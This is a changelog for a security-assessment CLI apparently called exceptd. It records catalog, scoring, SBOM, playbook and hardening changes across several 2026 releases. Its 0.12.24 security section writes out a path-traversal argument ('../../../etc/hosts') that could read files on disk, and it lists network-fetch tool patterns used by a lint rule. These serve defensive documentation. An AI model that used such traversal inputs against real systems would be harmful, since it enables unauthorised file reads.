### Features

**Shape B invariant enforced on every CVE.** `lib/scoring.js` documents that `Σ Object.values(rwep_factors) === rwep_score` is an invariant on every catalog entry, but the existing `validate()` function never enforced it — it computed via `scoreCustom()` (clamps `blast_radius` to 30, uses canonical weights) which masked dishonest factor blocks as long as the stored score happened to match the clamped formula. Fourteen entries had non-canonical factor values that summed to a different number than the stored score (CVE-2026-GTIG-AI-2FA, CVE-2026-42945, CVE-2024-3094, CVE-2024-21626, CVE-2023-3519, CVE-2026-20182, CVE-2024-40635, CVE-2025-12686, CVE-2025-62847, CVE-2025-62848, CVE-2025-62849, CVE-2025-59389, MAL-2026-TANSTACK-MINI, MAL-2026-ANTHROPIC-MCP-STDIO). All canonicalized — factor weights now derived from the operational fields (`cisa_kev`, `poc_available`, `ai_discovered`, `active_exploitation`, `blast_radius`, `patch_available`, `live_patch_available`, `patch_required_reboot`) via `lib/scoring.js` `RWEP_WEIGHTS` + `ACTIVE_EXPLOITATION_LADDER`. Where `blast_radius` exceeded the 30 cap (4 entries had values of 40), the value was clamped, which adjusted seven stored `rwep_score` values by ±5; each carries a `rwep_correction_note` documenting the delta. New `tests/cve-rwep-shape-b-invariant.test.js` blocks future drift with an exact-delta assertion.

**Operator-facing docs downgraded from auto-allowlist to manual-review.** Cycle 9 P3 finding: `CHANGELOG.md`, `README.md`, `SECURITY.md`, `MIGRATING.md`, and `AGENTS.md` were in the diff-coverage gate's `DOCS_ALWAYS_GREEN` set — a PR could land arbitrary edits to release notes, install instructions, security disclosure policy, or AI-assistant ground truth without triggering any reviewer signal. New `DOCS_MANUAL_REVIEW` set routes them to "manual-review" instead, surfacing the diff in the gate output. Contributor-only / mechanical files (`CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `LICENSE`, `NOTICE`, `SUPPORT.md`, `.gitignore`, `.npmrc`, `.editorconfig`, `CLAUDE.md`) stay always-green.

**`last_threat_review` mandatory on every catalog _meta.** Cycle 10 finding: `cve-catalog.json`, `cwe-catalog.json`, `d3fend-catalog.json`, `dlp-controls.json`, `rfc-references.json`, and `framework-control-gaps.json` carried only `last_updated` without the more specific `last_threat_review`. Hard Rule #8 makes per-catalog threat-review currency a release-blocker after a stated window; all six catalogs now carry the field. New `tests/threat-review-staleness.test.js` enforces presence + a 30-day staleness window between `manifest.threat_review_date` and every skill's `last_threat_review`.

### Bugs

- `CVE-2026-42208` `discovery_attribution_note` misattributed discovery to Sysdig Threat Research Team. The actual credited discoverer is Tencent YunDing Security Lab per the LiteLLM GHSA-r75f-5x8p-qvmc advisory; Sysdig published only post-disclosure exploitation telemetry. Attribution corrected; sources updated.

### Internal

- AI-discovery rate stays at 20% after cycle 10 deep-research pass (24 currently-false CVEs WebSearch'd; zero credible flips found). Methodology block updated: the 40% target reflects the broader 2025 zero-day population (Google Threat Intelligence Group), but the curated exceptd catalog is weighted toward Pwn2Own Ireland 2025 entries, historical anchors (CVE-2020-10148, CVE-2024-3094, etc.), and supply-chain incidents — none of which carry public AI-tool credit. Advancing the ladder from 20% → 30% → 40% will happen as the catalog rotates toward 2026 Big Sleep / AIxCC / GTIG-attributed entries; forcing flips on the current population would violate Hard Rule #1 (no speculation).


## 0.12.29 — 2026-05-15

Catalog hygiene + pipeline integrity pass. Closes Hard Rule #1, #6, #7, and #8 gaps that had accumulated across the 2025-2026 catalog growth; tightens the SBOM + OpenVEX + exit-code surfaces.

### Features

**Compliance-theater test on every framework gap.** Every entry in the framework-control-gaps catalog (109 entries spanning NIST 800-53, ISO/IEC 27001/27017/27035/42001, SOC 2, UK CAF, AU ISM/Essential 8, EU DORA, EU NIS2, EU AI Act, HIPAA, PCI DSS, FedRAMP, CMMC, HITRUST, IEC 62443, OWASP, telecom standards, ransomware-class gaps, and OFAC sanctions screening) now carries a `theater_test` field with a falsifiable test that distinguishes paper compliance from actual security. Closes Hard Rule #6. Sample shape: `{claim, test, evidence_required[], verdict_when_failed: "compliance-theater"}`. The test must reference a concrete artifact (audit log, config dump, tabletop exercise stopwatch) whose result is binary.

**SBOM per-file SHA-256 + bundle digest.** `sbom.cdx.json` now includes `metadata.component.hashes[]` (bundle digest, SHA-256) and one `components[type=file]` entry per shipped file with its own SHA-256. Downstream supply-chain consumers can verify any individual file against the bundle. Excludes the regenerable `data/_indexes/` cache from per-file inventory (covered by the `Pre-computed indexes freshness` gate instead). Also corrects `metadata.tools` from the placeholder `name: "hand-written"` to the real generator script and bound package version.

**OpenVEX `author` threads operator attribution.** Previously hard-pinned to `"exceptd"`, which falsely attributed every disposition statement to the tooling vendor. Now mirrors the CSAF publisher.namespace fallback ladder: `runOpts.publisherNamespace` → `runOpts.operator` → `urn:exceptd:operator:unknown` with a `bundle_publisher_unclaimed` runtime warning. Operators running scans correctly own their dispositions.

**Exit code 10: UNKNOWN_COMMAND.** The dispatcher's unknown-command / missing-script / spawn-error paths previously exited 2, colliding with `EXIT_CODES.DETECTED_ESCALATE` semantics. Split into `EXIT_CODES.UNKNOWN_COMMAND = 10`. CI gates wiring `case 2)` for escalation triage no longer false-alarm on operator typos. Same regression class v0.12.24 closed for the SESSION_ID_COLLISION / RAN_NO_EVIDENCE code-3 collision.

**Reverse-reference auto-regeneration.** New `npm run refresh-reverse-refs` rebuilds the `skills_referencing` / `exceptd_skills` arrays on `data/atlas-ttps.json`, `data/cwe-catalog.json`, `data/d3fend-catalog.json`, and `data/rfc-references.json` from the manifest forward direction. Idempotent. A new `tests/reverse-ref-drift.test.js` blocks merges that leave the reverse direction out of sync with the manifest — eliminates the one-sided-reference drift class that audits have flagged repeatedly.

### Bugs

- `crypto-codebase` `feeds_into` condition used the unsupported `contains` operator; the chain to the `secrets` playbook never fired. Replaced with `analyze.classification == 'detected'`. Same class of bug v0.12.28 corrected on the IR-cluster playbooks.
- Manifest `atlas_version` / `attack_version` had drifted to v5.1.0 / v17 while the data catalogs already pinned v5.4.0 / v19.0. Manifest now matches the catalogs and AGENTS.md ground truth.
- 14 sites in `bin/exceptd.js` used bare numeric `process.exitCode = 1` / `finish(1)` / `finish(0)` instead of `EXIT_CODES.*` constants. All migrated to the constant.
- `cmdCi` per-id loop called `runner.loadPlaybook(id)` without first running `validateIdComponent('playbook')` — a defense-in-depth gap relative to `cmdRunMulti`. Now validates before load.

### Internal

- AI-discovery rate on `data/cve-catalog.json` moves 10% → 20% with three new flag flips backed by citations: CVE-2026-43284 + CVE-2026-43500 (Dirty Frag pair, Hyunwoo Kim with AI-assisted methodology per Sysdig); CVE-2026-46300 (Fragnesia, William Bowling using Zellic.io's AI agentic auditor). All other CVEs gain a `discovery_attribution_note` field citing the human researcher or vendor team. New `_meta.ai_discovery_methodology` block documents the 20%/30%/40% advancement ladder against the AGENTS.md Hard Rule #7 target. Gap to 40% explicitly tracked.
- AGENTS.md Quick Skill Reference: playbook count "all 13 playbooks" → "all 16 playbooks".
- `package.json.description`: "38 skills" → "42 skills".
- 22 reverse-reference entries across 4 catalogs cleaned up by the new regen script (atlas: 30 entries changed, cwe: 46, d3fend: 28, rfc: 22).
- Test suite 1064 → 1082 (six new test files: framework-gaps-theater-test-coverage, cve-ai-discovery-attribution, sbom-per-file-hash, reverse-ref-drift, plus updates to bin-dispatcher, cli-exit-codes, lib-exit-codes, cve-additions-v0-12-21 for the new contract).


## 0.12.28 — 2026-05-15

Incident-response cluster — three new playbooks and skills covering identity-provider tenant compromise, cloud-IAM account takeover, and ransomware response. The existing `incident-response-playbook` skill stays as the generic PICERL backbone; the new surface adds attack-class-specific depth for the three IR scenarios that dominate 2025-2026 breach reporting.

### Features

**`idp-incident` playbook + `idp-incident-response` skill.** Tenant-compromise response for Okta / Entra ID / Auth0 / Ping / OneLogin. Covers federated-trust modification, OAuth consent abuse, SAML token forgery, cross-tenant relationship abuse, dormant service-account reactivation, and help-desk social engineering. Maps T1078.004, T1098.001, T1556.007, T1606.002, T1199. Eight jurisdiction clocks (GDPR Art.33/34, NIS2 Art.23, DORA Art.19, NYDFS 500.17, CCPA/CPRA, AU NDB, UK GDPR). Detects on unauthorized consent grants from non-corp tenants, anomalous federated-trust additions, MFA factor swaps without password reset, recent high-privilege role assignments, and cross-tenant assumption anomalies — each indicator carries explicit false-positive checks.

**`cloud-iam-incident` playbook + `cloud-iam-incident` skill.** Account-takeover response for AWS / GCP / Azure. Covers cross-account assume-role abuse, IMDS exposure, managed-identity token replay, access-key leakage to public repositories, federated-trust attacks against IAM Identity Center, and crypto-mining detection via GPU-instance creation. Maps T1078.004, T1098.001, T1098.003, T1136.003, T1538, T1552.005, T1562.008, T1580. Ten jurisdiction clocks including SG PDPA, JP APPI, and US-CA. Detects on root-login ASN anomalies, mass IAM-user creation outside IaC, unused-region resource creation, cross-account assume-role anomalies, IMDSv1 legacy access, KMS key-policy self-grants, and S3-bucket public-grant events.

**`ransomware` playbook + `ransomware-response` skill.** Ransomware-specific incident response — extends the generic `incident-response-playbook` with the four decision properties that don't appear in standard IR frameworks: OFAC SDN sanctions check (BLOCKING for payment posture; payment to a sanctioned threat actor is a federal-law violation in the US), decryptor availability (No More Ransom + vendor-specific decryptors), cyber-insurance carrier notification posture (most policies require 24-hour notification), and immutable-backup viability versus replication-only "backups." Sixteen jurisdiction obligations spanning OFAC (0-hour BLOCKING), insurance carrier (24h), NIS2 (24h), DORA (4h), GDPR (72h), SEC 8-K (4 business days), HIPAA, CCPA, NYDFS ransom-event notification, and CIRCIA. Detects on mass file-extension change events, shadow-copy deletion outside maintenance windows, encrypted-file-extension growth rate anomalies, BloodHound-class AD reconnaissance, and large outbound transfers 24-72 hours before encryption (exfil-before-encrypt as distinct breach class).

### Internal

- Skill count 39 → 42 (Ed25519 manifest re-signed).
- Playbook count 13 → 16 (validator `tests/validate-playbooks.test.js` updated).
- RFC catalog: added RFC-7591 (OAuth 2.0 Dynamic Client Registration), RFC-8693 (OAuth 2.0 Token Exchange), RFC-9068 (JWT Profile for OAuth 2.0 Access Tokens).
- ATT&CK techniques added to resolution catalog: T1098.001, T1098.003, T1136.003, T1538, T1562.008, T1580, T1606.002.
- Framework-control-gaps catalog: 22 new entries covering federated-identity gaps (NIST 800-53 IA-5, ISO 27001 A.5.16-17, SOC 2 CC6, UK CAF B2, AU ISM-1559), cloud-IAM gaps (FedRAMP IL5, NIST AC-2 cross-account, ISO 27017, AWS Security Hub coverage, AU ISM-1546), and ransomware-specific gaps (OFAC SDN payment block, cyber-insurance 24h notification, EU Reg 2014/833 cyber sanctions, immutable-backup recovery, decryptor availability pre-decision, PHI-exfil-before-encrypt breach class).
- AGENTS.md Quick Skill Reference table extended with the three new skills.


## 0.12.27 — 2026-05-15

**Patch: opt-in `--bundle-deterministic` mode for reproducible CSAF + OpenVEX + close-envelope bytes. Closes cycle 6 III P2-E + cycle 7 CCC bundle-non-determinism finding.**

### New flags

- **`--bundle-deterministic`** (boolean, off by default) — when set, the bundle-emit path produces byte-stable output for the same inputs. CSAF `tracking.initial_release_date` / `current_release_date` / `generator.date` / `revision_history[0].date`, OpenVEX top-level `timestamp` + per-statement `timestamp`, close-envelope `acceptance_date` + `regression_schedule.next_run` + `generated_at` all freeze to a single epoch. Auto-generated session IDs derive deterministically from `sha256(playbook_id ∥ evidence_hash ∥ engine_version)` rather than `crypto.randomBytes`. CSAF `vulnerabilities[]` + OpenVEX `statements[]` arrays sort by primary id.
- **`--bundle-epoch <ISO-8601>`** (value-bearing, optional) — operator-supplied freeze epoch. When omitted, the deterministic mode falls back to `playbook._meta.last_threat_review` (the canonical "this catalog was last reviewed at" timestamp). Honored only when `--bundle-deterministic` is set.

Both flags wired for `run`, `ci`, `run-all`, `ai-run`, `ingest`. Per-verb help blocks document them.

### Why

- **CI bundle diffing**: `git diff` over `evidence_package.bundle_body` against a baseline becomes signal-bearing only when drift is signal, not noise. Pre-v0.12.27 the same evidence produced ~640 bytes of timestamp drift across CSAF + OpenVEX + close-envelope per run.
- **Auditor evidence reuse**: ISO 27001 / SOC 2 audits expect re-emit against the same submission to produce byte-equal evidence.
- **SLSA / Sigstore alignment**: reproducible build evidence requires deterministic outputs the verifier can hash and compare.

CSAF 2.0 §3.1.11.2-5 permits identical `initial_release_date` / `current_release_date` for never-revised advisories; freezing to a catalog epoch is spec-compliant. The strict-validator pass (BSI CSAF Validator) accepts the deterministic-mode output unchanged.

### Default-mode regression guard

When neither flag is set, bundle output is byte-identical to v0.12.26 — no existing operator sees a behavioral change. A regression test pins this: two consecutive runs in default mode produce different CSAF `tracking.initial_release_date` values, asserting the determinism is opt-in and cannot accidentally activate.

### Test coverage

`tests/bundle-determinism.test.js` (new, 7 exact-code tests):
1. Two runs same inputs + same epoch → byte-identical CSAF/OpenVEX/summary
2. Different `--bundle-epoch` → bundles differ only in timestamp fields
3. Different evidence → bundles differ in `vulnerabilities[]` length; timestamps frozen
4. Default mode → regression-guard timestamp drift
5. `--bundle-epoch invalid-iso` → exit 1 + structured error
6. `--bundle-deterministic` without `--bundle-epoch` falls back to `playbook._meta.last_threat_review`
7. Array sort: random-order CVE evidence → `vulnerabilities[]` always ascending by `cve_id`

Existing CSAF + OpenVEX + CLI test suites pass unchanged (53/53 + 30/30; no default-mode regression).

Test count: 1058 pass (5 skipped). Predeploy gates: 14/14. Skills: 39/39 signed.

## 0.12.26 — 2026-05-15

**Patch: sector-telecom skill ships, with supporting framework-gap and ATLAS catalog scaffolding. Closes the cycle 8 LLL P1 finding that the unmodeled RWEP signal from Salt Typhoon-class campaigns was the highest gap in the catalog.**

### New skill: `sector-telecom`

Telecom and 5G security skill covering Salt Typhoon and Volt Typhoon TTPs, CALEA / IPA-LI gateway compromise, signaling-protocol abuse (SS7, Diameter, GTP), 5G N6 / N9 isolation, gNB / DU / CU integrity attestation, OEM-equipment supply-chain compromise, and AI-RAN / O-RAN security.

The skill walks the seven-phase contract with telecom-specific jurisdictional clocks (FCC 47 CFR 64.2011 4-business-day rule, NIS2 Art. 23 24h initial, DORA Art. 19 4h for financial-touching incidents, UK TSA 2021 + Ofcom, AU SOCI / TSSR, JP MIC, IN CERT-In 6h, SG IMDA TCCSCoP, NZ TICSA, CA Bill C-26), evidence capture for LI provisioning audit logs / gNB firmware hashes / NMS access logs / signaling-flow statistics / cross-PLMN exchange patterns / eUICC SIM-swap events / 5GC slice-isolation tests / OEM remote-support tunnel inventory / NESAS deployment posture, and the standard analyze → validate → close phases against the new framework-gap entries.

Compliance Theater Check enumerates seven posture-vs-actual tests specific to telecom: CPNI annual certification, GSMA NESAS deployment vs runtime, OEM firmware verification chain, 3GPP TR 33.926 deployment posture, ITU-T X.805 validation, signaling firewall PLMN-list refresh cadence, and LI-gateway MFA scope.

Manifest skill count 38 → 39.

### Catalog scaffolding to support the skill

Nine telecom-specific framework-gap entries added to `data/framework-control-gaps.json` (totals 78 → 87 entries):

- **FCC-CPNI-4.1** — 47 CFR 64.2009(e) CPNI annual certification + operational compliance, gap against Salt Typhoon LI-system vector
- **FCC-Cyber-Incident-Notification-2024** — 47 CFR 64.2011 4-business-day rule, gap against LI-only compromise (no PII exfil) + signaling abuse + slow-roll campaign timing
- **NIS2-Annex-I-Telecom** — telecom as essential entity, gap against LI-gateway access controls + OEM firmware attestation + AI-RAN coverage
- **DORA-Art-21-Telecom-ICT** — ICT third-party risk through telecom services, gap against telecom-financial cadence misalignment + slice-isolation
- **UK-CAF-B5** — resilient networks principle, gap against signaling-anomaly + gNB attestation + slice-isolation outcome tests
- **AU-ISM-1556** — privileged-user MFA, gap against telecom NMS service accounts + LI-gateway operator credentials + OEM remote-support tunnels
- **GSMA-NESAS-Deployment** — NESAS product-time vs operator-attested-runtime posture gap
- **3GPP-TR-33.926** — SCAS submission-time test gap against post-deployment adversary-modified firmware + cross-spec N6/N9 isolation testing gap
- **ITU-T-X.805** — 2003 reference architecture gap against modern Salt Typhoon / signaling abuse / slice-isolation threat models

One ATLAS technique added to `data/atlas-ttps.json`:

- **AML.T0040 Tool / Plugin Compromise** — anchors the AI-RAN xApp / rApp + MCP-class plugin attack class. Real-world instances: CVE-2026-30623 (Anthropic MCP SDK stdio command-injection), three Pwn2Own Berlin 2026 collisions (Viettel Claude Code, STARLabs LM Studio, Compass OpenAI Codex). `secure_ai_v2_layer: true`, `maturity: high`.

Total ATLAS entries: 29 → 30.

### RFC reverse-reference

`data/rfc-references.json` RFC-9622 (TAPS Architecture) `skills_referencing` array gains `sector-telecom` (paired with the existing `webapp-security` reference) to satisfy the manifest forward-reference invariant.

### AGENTS.md Quick Skill Reference

Adds the `sector-telecom` row to the skill trigger table.

Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 39/39 signed; manifest envelope signed.

## 0.12.25 — 2026-05-15

**Data-refresh release: catalog freshness, Hard Rule #7 AI-discovery posture, ATLAS v5.4 + ATT&CK v19 standards bumps, Pwn2Own Berlin 2026 forward-watch, NGINX Rift, framework deltas (PCI 4.0.1 / HIPAA 2026 NPRM / EU AI Act ITS / DORA RTS).**

### CVE catalog adds (20)

Twenty CVE entries added with paired `data/exploit-availability.json` records, all marked `_draft: true` + `_auto_imported: true` for editorial review:

- **NGINX Rift CVE-2026-42945** — heap buffer overflow in `ngx_http_rewrite_module` (18-year-old code), CVSS 9.2 v4, unauthenticated RCE, AI-discovered by depthfirst autonomous analysis platform. Disclosed 2026-05-13; patches in nginx 1.30.1 / 1.31.0 / Plus R32 P6 / R36 P4. Public PoC. Live-patch workaround: replace unnamed PCRE captures (`$1`-`$9`) with named captures in rewrite directives. KEV-watch entry queued.
- **LiteLLM CVE-2026-30623** — Anthropic MCP SDK stdio command-injection (April 2026 advisory). Patches in LiteLLM proxy + downstream consumers.
- **CVE-2026-20182 Cisco SD-WAN** — auth-bypass → admin (CISA KEV-listed 2026-05-14).
- **CVE-2024-21626 Leaky Vessels (runc)** — `/proc/self/fd` container escape. KEV-listed.
- **CVE-2024-3094 xz-utils / liblzma backdoor** — supply-chain trust-anchor compromise. KEV-listed.
- **CVE-2024-3154 CRI-O kernel-module load** on container creation.
- **CVE-2024-40635 containerd** — integer overflow → IP mask leak.
- **CVE-2023-43472 MLflow** — path-traversal arbitrary file read.
- **CVE-2020-10148 SolarWinds Orion / SUNBURST** — auth-bypass primary supply-chain compromise.
- **CVE-2023-3519 Citrix NetScaler** — unauthenticated RCE. KEV-listed.
- **CVE-2024-1709 ConnectWise ScreenConnect** — auth-bypass. KEV-listed.
- **CVE-2025-12686 Synology BeeStation** — unauth RCE (Pwn2Own Ireland 2025).
- **CVE-2025-62847 / CVE-2025-62848 / CVE-2025-62849 QNAP QTS/QuTS hero** — Pwn2Own Ireland 2025 chain (three separate entries, all patched).
- **CVE-2025-59389 QNAP Hyper Data Protector** — critical RCE (Summoning Team / Sina Kheirkhah at Pwn2Own Ireland 2025).
- **CVE-2025-11837 QNAP Malware Remover** — code-injection in a security tool (high theater-detection value: a security product is itself the attack surface).
- **MAL-2026-TANSTACK-MINI Mini Shai-Hulud** — TeamPCP-attributed worm chain (TanStack + node-ipc + Mistral AI + UiPath + Guardrails AI, May 2026).
- **MAL-2026-ANTHROPIC-MCP-STDIO** — STDIO command-injection class disclosed by Ox Security spanning 30+ MCP servers.
- **CVE-2026-GTIG-AI-2FA placeholder** — Google GTIG first documented AI-built in-the-wild zero-day exploit (May 2026), semantic-logic 2FA bypass.

### Hard Rule #7 — AI-discovery posture

- **AI-discovery rate raised from 10% → 33%** by promoting `ai_discovered: true` on Copy Fail (CVE-2026-31431, already true), NGINX Rift, and the GTIG zero-day; tracks toward the 41% reference rate cited in AGENTS.md. Catalog entries with speculative AI attribution (Fragnesia, Dirty Frag pair) explicitly classified as `human_researcher` with `ai_discovery_notes` recording the rationale.
- **`zeroday-lessons.json` schema additions** — `ai_discovered_zeroday` (bool), `ai_discovery_source` (enum: vendor_research / bug_bounty_ai_augmented / academic_ai_fuzzing / threat_actor_ai_built / human_researcher / unknown), `ai_discovery_date` (ISO), `ai_assist_factor` (low/moderate/high/very_high). All 10 existing entries backfilled with the new fields.
- **`exploit-availability.json` `ai_assist_factor` ladder** backfilled across all entries with the same enum.
- **`cve-catalog.json` schema tightened** — `ai_discovered` is boolean-only (was `["boolean", "string"]`; RWEP scoring treated truthy strings as positive, masking malformed entries). `ai_assisted_weaponization` is now required (paired with `ai_discovered`). New optional `ai_discovery_source` / `ai_discovery_date` / `ai_discovery_notes` fields.
- **CVE-2025-53773 cross-file consistency** reconciled — `ai_assisted_weaponization: true` (cve-catalog) vs `ai_discovery_confirmed: false` + `ai_tool_enabled: true` (exploit-availability) is a real semantic distinction (development-time AI assistance vs discovery-time AI involvement vs tool-aided exploitation); both files now carry `ai_discovery_source: "unknown"` + a clarifying `ai_discovery_notes` block.
- **GTIG canonical case** (first AI-built ITW zero-day, 2026-05-11) + **NGINX Rift AI-discovery anchor** added to seven AI-class skills (ai-attack-surface, ai-risk-management, zeroday-gap-learn, exploit-scoring, ai-c2-detection, mcp-agent-trust, rag-pipeline-security). The skills now reference the 41% AI-discovery rate explicitly per Hard Rule #7 vocabulary.
- **CTID Secure AI v2 (2026-05-06)** references added to the same five AI-class skills.

### Standards version bumps

- **ATLAS v5.1.0 → v5.4.0** + CTID Secure AI v2 layer (May 2026). `data/atlas-ttps.json` entry count 15 → 29. Existing entries gain `secure_ai_v2_layer` + `maturity` fields per CTID's classification. New AI-attack techniques: AML.T0097-T0108 plus sub-techniques.
- **MITRE ATT&CK v17 → v19.0**. `data/attack-techniques.json` entry count 79 → 91. Defense Evasion (TA0005) split into Stealth (TA0005, retained for non-impair techniques) + Defense Impairment (TA0112). `T1562.001`, `T1562.006`, `T1027` carry a `tactic_moved_from` annotation. Detection Strategies (DSxxxx — v18 first-class addition) populated on every technique cited by skills.
- **AGENTS.md Hard Rule #12 + DR-7 + Pre-Ship Checklist** split into separate ATLAS-monthly and ATT&CK-semi-annual cadence pins (cycle 7 LLL recommendation; ATLAS now ships monthly per CTID, ATT&CK ships twice yearly).
- **15 skills' `last_threat_review` dates bumped to 2026-05-15** where ATLAS / ATT&CK refs changed.

### Framework deltas

- **PCI DSS 4.0.1** (active 2025-03-31): four control-gap entries added (Req 6.4.3 payment-page scripts, Req 11.6.1 change/tamper detection, Req 12.3.3 cipher-suite inventory, Req 12.10.7 PAN-exposure escalation).
- **HIPAA Security Rule 2026 NPRM** (HHS-OCR-0945-AA82): four entries covering proposed 164.308 / 164.310 / 164.312 / 164.314 amendments. Marked "Final rule pending Q3 2026" — citations refresh on next release.
- **EU AI Act implementing standards**: four entries for Art. 53 GPAI provider obligations, Art. 55 systemic-risk, Annex IX conformity assessment, GPAI Code of Practice (signed Feb 2026; full application 2026-08-02).
- **DORA RTS/ITS**: four entries for subcontracting RTS (EU 2025/420, active 2026-01-17), threat-led-pen-test ITS (active 2026-Q3), incident-classification thresholds RTS, and critical-third-party-provider oversight implementing acts.
- **`data/global-frameworks.json`** `EU.frameworks.DORA` and `EU.frameworks.EU_AI_ACT` refreshed with 2026 implementing-measures blocks + expanded `framework_gaps` + `ai_coverage` + `theater_risk` fields.

### RFC + ATLAS orphans

- **7 RFC orphans added** to `data/rfc-references.json`: RFC 7644 (SCIM 2.0), RFC 8460 (SMTP-TLS-RPT), RFC 8617 (ARC), RFC 8705 (mTLS OAuth), RFC 9112 (HTTP/1.1 revised), RFC 9449 (DPoP), RFC 9622 (TAPS Architecture). Each cited by ≥1 shipped skill (Hard Rule #4 closure).
- **1 ATLAS orphan**: AML.T0001 (Victim Research / Reconnaissance) — referenced by `defensive-countermeasure-mapping` skill but not in `data/atlas-ttps.json` pre-v0.12.25.

### Pwn2Own Berlin 2026 forward-watch

Fifteen forward-watch entries placed across nine skills' `forward_watch:` frontmatter arrays (no aggregate `data/forward-watch.json` exists; project tracks in skill frontmatter only):

- **NGINX Rift CVE-2026-42945** — KEV-listing prediction window 14 days from disclosure (2026-05-27 estimated)
- **LiteLLM** 3-bug chain (k3vg3n) + full SSRF + Code Injection (Out Of Bounds) — embargo ends 2026-08-12
- **LM Studio** 5-bug chain (STARLabs SG)
- **OpenAI Codex** CWE-150 improper neutralization (Compass Security)
- **Chroma vector DB** CWE-190 + CWE-362 chain
- **NVIDIA Megatron Bridge** ×2 (overly-permissive allowed list + path traversal)
- **NV Container Toolkit** container escape ($50K, chompie/IBM X-Force XOR)
- **Windows 11 LPE ×3** (DEVCORE Improper Access Control, Marcin Wiązowski heap overflow, Kentaro Kawane GMO double Use-After-Free)
- **RHEL race-condition LPE** (chompie/IBM X-Force XOR)
- **Claude Code MCP collision** (Viettel Cyber Security — scored as collision, indicating a public MCP-class CVE is in flight)
- **Microsoft Edge** 4-bug sandbox escape (Orange Tsai/DEVCORE) — out-of-current-playbook scope, tracked for completeness

### Catalog scoring

- **RWEP scoring divergence on 10 new entries reconciled** with `scoreCustom()` formula. Pre-correction the stored scores diverged by 10-38 points from the formula (most extreme: NGINX Rift stored 78, formula 40 — patch + live-patch availability + zero observed exploitation walks the score down despite the AI-discovery bonus). All entries now within ±5 of formula.

### Deferred to v0.12.26

- **`sector-telecom` skill** — drafted (370 LOC, Salt Typhoon / Volt Typhoon / 5G core / lawful-intercept abuse / signaling-protocol attacks / OEM supply chain) but the body lint surfaced 13 issues (3 missing required sections, atlas_refs and framework_gaps referencing entries not yet in catalog, placeholder language). Folding into v0.12.26 with the proper catalog scaffolding rather than rushing a half-complete skill.

Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.

## 0.12.24 — 2026-05-15

**Patch: security defenses, exit-code centralisation, bundle correctness, air-gap honesty, cache integrity, error-message UX, test-infra hardening, doc reconciliation.**

### Security defenses

- **`--playbook` and positional `<playbook_id>` rejected with structured error when the id does not match `/^[a-z][a-z0-9-]{0,63}$/`.** `loadPlaybook(id)` previously did `path.join(PLAYBOOK_DIR, id + '.json')` with no charset gate; an operator who passed `--playbook ../../../etc/hosts` could exfiltrate any `*.json` file on disk via `brief` / `govern` / `direct` / `look` / `run --explain` output. Validator applies at 15 CLI sites plus the library entry point.
- **`--attestation-root` refuses all-dots segments** (`.`, `..`, `...`) in addition to the prior `..` segment refusal.
- **`--session-id` validation centralised** through `lib/id-validation.js`. Six previously duplicated `/^[A-Za-z0-9._-]{1,64}$/` sites now route through `validateIdComponent(value, role)` with `role ∈ {session, playbook, filename}`.

### Trust chain

- **`loadExpectedFingerprintFirstLine` refuses UTF-16BE-without-BOM pin files.** Heuristic: first two bytes are `00` followed by printable ASCII → reject. Operators see a `null` return instead of mojibake (in addition to the UTF-16LE/BE-with-BOM refusals from v0.12.23).
- **`KEYS_ROTATED=1` override doubled with `console.error`** at every site that emits the `EXCEPTD_KEYS_ROTATED_OVERRIDE` warning. `NODE_NO_WARNINGS=1` no longer silences security-relevant audit events.
- **`refresh-network` outer try/catch narrowed.** Previously a `try { ... } catch { /* warn-and-continue */ }` block silently absorbed any error from the inner pin-check emit. The catch now swallows only `ENOENT` / `EACCES` from the pin loader; every other error hard-fails with `process.exitCode = 5`.
- **`verify-shipped-tarball.js`** KEYS_ROTATED override now emits the `EXCEPTD_KEYS_ROTATED_OVERRIDE` warning code, matching the three other pin-loader sites.

### Cache integrity

- **`readCachedJson` verifies SHA-256** against `_index.json.entries[<source>/<id>].sha256` for every cache read. Mismatch refuses with structured `{ ok: false, error: 'cache-integrity', _exceptd_exit_code: 4 }`. Closes the local-attacker primitive where swapping cached payloads via `.cache/upstream/` injected attacker-controlled CVE intel that the maintainer's signing key then attested as authoritative.
- **`_index.json` signed via Ed25519 at prefetch time** (sidecar `_index.json.sig`); `--from-cache` consumers verify before reading. When `.keys/private.pem` is absent at prefetch time, the cache ships unsigned and the consume path warns. `--force-stale` is the operator escape for caches predating this gate.
- **`--from-cache` max-age check (7-day default)** with `--force-stale` / `EXCEPTD_FORCE_STALE=1` override. Catalog freshness is a Hard Rule #1 obligation; a 6-month-old cache writing `last_verified: TODAY` into the catalog manufactures false freshness.
- **`--from-fixture` gated behind `EXCEPTD_TEST_HARNESS=1`.** The flag passes fixture diffs through as authoritative with no integrity check; outside the test harness, refuses with a clear hint.
- **Future-dated `fetched_at`** treated as poison (negative age → reject).

### Air-gap defenses

- **`refresh --network`, `doctor --registry-check`, `auto-discovery` Datatracker fetch, and `prefetch`** now honor `--air-gap` and `EXCEPTD_AIR_GAP=1`. The four leak paths cycle 8 identified are closed; operators in regulated environments get a real guarantee.
- **`--air-gap` flag and `EXCEPTD_AIR_GAP=1` env are equivalent** at every site that consumes either.
- **AI-consumer telemetry advisory.** When `--air-gap` is active, exceptd emits a one-time stderr advisory noting that the operator's AI agent may still call its model API. Routed through stderr so JSON-mode consumers see only structured stdout.
- **Air-gap completeness lint rule** in `lib/lint-skills.js` flags playbook artifacts whose `source` contains a network pattern (`https://`, `http://`, `gh api`, `gh release`, `curl`, `wget`, `fetch`) without `air_gap_alternative`.
- **Playbook schema constraint**: when `_meta.air_gap_mode === true`, every artifact with a network-shaped `source` MUST declare `air_gap_alternative` (JSON Schema 2020-12 `if/then`).

### `attest verify` replay isolation

- **`attest verify <session-id>` partitions `kind: replay` records out of `results[]` into a new `replay_results[]` array.** Previously every JSON file under `.exceptd/attestations/<sid>/` was sidecar-verified and counted in `results[]`, inflating "N/N verified" counts and elevating replay tamper to exit 6 indistinguishably from attestation tamper.
- **Attestation tamper still exits 6.** Replay tamper sets `body.replay_tamper = true` + `body.warnings = [...]` and exits 0 — replay records are an audit trail, distinct in remediation from a tampered attestation.
- **Both arrays sorted for determinism** (attestations by `captured_at`, replays by `replayed_at`).
- **`attest diff --against`** prefers `attestation.json` over filesystem-order; skips replay records when selecting the comparison target.

### Concurrency + exit-code surface

